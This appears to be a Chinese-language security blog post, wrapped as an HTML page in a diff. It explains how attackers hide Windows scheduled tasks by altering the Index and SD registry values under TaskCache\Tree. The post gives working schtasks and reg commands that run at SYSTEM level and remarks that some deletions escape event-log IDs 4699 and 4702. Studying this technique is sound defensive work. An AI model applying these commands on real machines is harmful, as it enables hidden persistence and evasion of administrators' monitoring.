@@ -1,0 +1,150 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Hide_Windows_Schtasks // As1KamE7</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.124.1">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="John Doe" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
+    
+
+    
+    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Hide_Windows_Schtasks"/>
+<meta name="twitter:description" content="通过删除 Windows 注册表路径 HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\TASK_NAME 中的 SD 值来隐藏其计划任务
+Threat Actor 创建每个计划任务时，会创建两个注册表子项
+1. HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\TASK_NAME 2. HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{GUID} 在 Tasks 路径中创建的第二个子项 {GUID} 与 Tree 子项中的 Id 值匹配
+通过删除 SD 值，让命令失效 schtasks /query
+当创建计划任务时，除了 Tree 和 Tasks 子项之外，还会创建一个子项。 取决于任务是否计划在引导时运行（由 schtasks /create 命令中的 /sc onstart 参数指示）或在 用户登录期间运行（由 schtasks /create 命令中的 /sc onlogon 参数指示）或在 除引导 或 登录
+1. HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Boot\{GUID} 2. HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Logon\{GUID} 3. HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{GUID} Tree 子项中的 Index 值也与计划任务关联的第三个子项相关。 Index 值设置为 0x1 , 0x2 , 0x3"/>
+
+    <meta property="og:title" content="Hide_Windows_Schtasks" />
+<meta property="og:description" content="通过删除 Windows 注册表路径 HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\TASK_NAME 中的 SD 值来隐藏其计划任务
+Threat Actor 创建每个计划任务时，会创建两个注册表子项
+1. HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\TASK_NAME 2. HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{GUID} 在 Tasks 路径中创建的第二个子项 {GUID} 与 Tree 子项中的 Id 值匹配
+通过删除 SD 值，让命令失效 schtasks /query
+当创建计划任务时，除了 Tree 和 Tasks 子项之外，还会创建一个子项。 取决于任务是否计划在引导时运行（由 schtasks /create 命令中的 /sc onstart 参数指示）或在 用户登录期间运行（由 schtasks /create 命令中的 /sc onlogon 参数指示）或在 除引导 或 登录
+1. HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Boot\{GUID} 2. HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Logon\{GUID} 3. HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{GUID} Tree 子项中的 Index 值也与计划任务关联的第三个子项相关。 Index 值设置为 0x1 , 0x2 , 0x3" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://as1kame7.github.io/posts/hide_windows_schtasks/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-06-11T03:59:34-04:00" />
+<meta property="article:modified_time" content="2024-06-11T03:59:34-04:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://as1kame7.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="John Doe" /></a>
+      <span class="app-header-title">As1KamE7</span>
+      <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nunc vehicula turpis sit amet elit pretium.</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Hide_Windows_Schtasks</h1>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jun 11, 2024
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          2 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>通过删除 Windows 注册表路径 <code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\TASK_NAME</code> 中的 SD 值来隐藏其计划任务</p>
+<h3 id="threat-actor">Threat Actor</h3>
+<p>创建每个计划任务时，会创建两个注册表子项</p>
+<pre tabindex="0"><code>1. HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\TASK_NAME
+
+
+2. HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{GUID}
+</code></pre><p>在 Tasks 路径中创建的第二个子项 <code>{GUID}</code> 与 <code>Tree</code> 子项中的 <code>Id</code> 值匹配</p>
+<blockquote>
+<p>通过删除 SD 值，让命令失效 <code>schtasks /query</code></p>
+</blockquote>
+<p>当创建计划任务时，除了 Tree 和 Tasks 子项之外，还会创建一个子项。
+取决于任务是否计划在引导时运行（由 <code>schtasks /create</code> 命令中的 <code>/sc onstart</code> 参数指示）或在 用户登录期间运行（由 <code>schtasks /create</code> 命令中的 <code>/sc onlogon</code> 参数指示）或在 除引导 或 登录</p>
+<pre tabindex="0"><code>1. HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Boot\{GUID}
+
+2. HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Logon\{GUID}
+
+3. HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{GUID}
+</code></pre><p><code>Tree</code> 子项中的 <code>Index</code> 值也与计划任务关联的第三个子项相关。
+<code>Index</code> 值设置为 <code>0x1 , 0x2 , 0x3</code></p>
+<pre tabindex="0"><code>All tasks registered within the path HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Boot has Index value of 0x1
+
+2. All tasks registered within the path HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Logon has Index value of 0x2
+
+3. All tasks registered within the path HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\(Plain or Maintenance) has Index value of 0x3
+</code></pre><p>每个计划任务都是启动或登录或普通或维护的一部分，因此索引似乎只有三个可能的值，即 <code>0x1、0x2、0x3</code>。</p>
+<ol>
+<li>
+<p>隐藏特定的计划任务：将 Tree 子项中的 Index 值设置为 0x0 会在任务计划程序应用程序 和 <code>schtasks /query</code> 的输出中隐藏该任务。但是，即使系统重新启动，任务也会继续按照计划运行。尝试使用 <code>schtasks /change</code> 命令修改索引设置为 0x0 的任务，该任务将被删除。但是，与计划任务删除对应的事件 ID 4699 不会报告到 Windows 安全事件日志。</p>
+</li>
+<li>
+<p>隐藏所有计划任务：删除 Index 值会导致任务计划程序应用程序 和 <code>schtasks /query</code> 失败，并显示错误消息 “发生内部错误”，这实际上隐藏了所有计划任务。现有任务继续运行，并且仍然可以创建新任务。</p>
+</li>
+</ol>
+<p>将索引设置为任何其他值 <code>0x4、0xffff</code> 等不会隐藏计划任务，并且任务将继续按照其计划运行。</p>
+<p>创建一个计划任务在任何用户登录的情况下执行</p>
+<pre tabindex="0"><code>schtasks /create /tn TestTask /tr cmd.exe /sc onlogon /rl highest
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>schtasks /query | where {$_ <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;TestTask&#34;</span>}
+</span></span><span style="display:flex;"><span>TestTask                                 N/A                    就绪
+</span></span></code></pre></div><p>查看三个键值</p>
+<pre tabindex="0"><code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\TestTask
+
+HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{49C391EC-9065-4092-87DF-05F65CEBB0D1}
+
+HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Logon\{49C391EC-9065-4092-87DF-05F65CEBB0D1}
+</code></pre><p><code>index</code> 值为 2</p>
+<h3 id="hide-scheduled-task">Hide Scheduled Task</h3>
+<p>创建另一个计划任务，该任务以 SYSTEM 权限执行一次（在创建 ImpTask 之后），并将其 Index 值设置为 0x0</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator&gt;schtasks /create /tn ModifyIndexTask /tr <span style="color:#e6db74">&#34;reg add \&#34;HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\TestTask\&#34; /v Index /t REG_DWORD /d 0x0 /f&#34;</span> /ru <span style="color:#e6db74">&#34;NT AUTHORITY\SYSTEM&#34;</span> /rl highest /sc once /st <span style="color:#e6db74">&#34;10:14&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 成功: 成功创建计划任务 &#34;ModifyIndexTask&#34;。</span>
+</span></span></code></pre></div><p>设置为 <code>0x0</code> , <code>schtasks /query | findstr -i &quot;TestTask&quot;</code> 无法查看
+但是可以采用 <code>\tn</code></p>
+<pre tabindex="0"><code>PS C:\Users\Administrator&gt; schtasks /query /tn &#34;TestTask&#34;
+
+文件夹: \
+任务名                                   下次运行时间           模式
+======================================== ====================== ===============
+TestTask                                 N/A                    就绪
+</code></pre><pre tabindex="0"><code>PS C:\Users\Administrator&gt; reg query &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\TestTask&#34;
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\TestTask
+    SD    REG_BINARY    01000480880000009800000000000000140000000200740004000000001018009F011F0001020000000000052000000020020000001014009F011F0001010000000000051200000000101800FF011F00010200000000000520000000200200000000240089001200010500000000000515000000B91F081A59F058001BA317BDF40100001200000001020000000000052000000020020000010500000000000515000000B91F081A59F058001BA317BD01020000
+    Id    REG_SZ    {49C391EC-9065-4092-87DF-05F65CEBB0D1}
+    Index    REG_DWORD    0x0
+</code></pre><p>使用 <code>schtasks /change /tr</code> 命令更改 <code>TestTask</code> 中的程序名称，任务将被删除，但是Windows日志不会报 4699 计划任务删除 和 4702 计划任务更新
+但是使用 <code>schtasks /delete</code> 则会出现 4699</p>
+<h3 id="hide-all-schedyled-tasks">Hide All Schedyled Tasks</h3>
+<p>使用 SYSTEM 权限执行的计划任务并删除 <code>TeskTask</code> 子项中的 <code>Index</code> 值。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>schtasks /create /tn ModifyIndexTask /tr <span style="color:#e6db74">&#34;reg.exe delete \&#34;HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\ImpTask\&#34; /v Index /f&#34;</span> /ru <span style="color:#e6db74">&#34;NT AUTHORITY\SYSTEM&#34;</span> /rl highest /sc once /st <span style="color:#e6db74">&#34;10:20&#34;</span>
+</span></span></code></pre></div><p>一旦删除了 <code>TestTask</code> 子项中的 <code>Index</code> 值，所有计划任务都会从任务计划程序应用程序 和 <code>schtasks /query</code> 命令的输出中消失，收到一条错误消息：“发生了内部错误”
+即使在参数 <code>/tn</code> 中指定任务名称 <code>TestTask</code> 也不起作用</p>
+<p>尽管不显示，但是他们仍然会执行每个计划任务，即使系统重新启动后，仍然无法查看计划任务。</p>
+<p><code>schtasks /change</code> 命令修改 会再次修改 <code>index</code> 值</p>
+<p>使用 <code>schtasks /delete</code> 删除 <code>TestTask</code>（删除索引值后）时，该命令失败并显示错误消息。接下来，当我们尝试使用 schtasks 更改 <code>TestTask</code>时 <code>/change</code> 命令，<code>TestTask</code> 子项中的 <code>Index</code> 值已恢复，所有任务重新出现在 Task Scheduler 应用程序中，并且 <code>schtasks /query</code> 的执行也成功</p>
+<p>而且必须要让 <code>schtasks /delete</code> 先执行，再执行 <code>schtasks /change</code></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
